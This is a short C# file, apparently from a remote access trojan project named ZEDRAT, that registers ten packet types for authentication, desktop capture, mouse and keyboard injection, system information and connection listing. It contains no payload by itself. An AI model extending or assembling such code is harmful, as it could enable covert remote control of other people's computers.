using System;
using ZEDRatApp.ZEDRAT.Packets.ClientPackets;
using ZEDRatApp.ZEDRAT.Packets.ServerPackets;

namespace ZEDRatApp.ZEDRAT.Packets
{
	public class PacketRegistery
	{
		public static Type[] GetPacketTypes()
		{
			return new Type[10]
			{
				typeof(GetAuthentication),
				typeof(GetDesktop),
				typeof(DoMouseEvent),
				typeof(DoKeyboardEvent),
				typeof(GetSystemInfo),
				typeof(GetMonitors),
				typeof(SetAuthenticationSuccess),
				typeof(GetConnections),
				typeof(GetAuthenticationResponse),
				typeof(GetConnectionsResponse)
			};
		}
	}
}
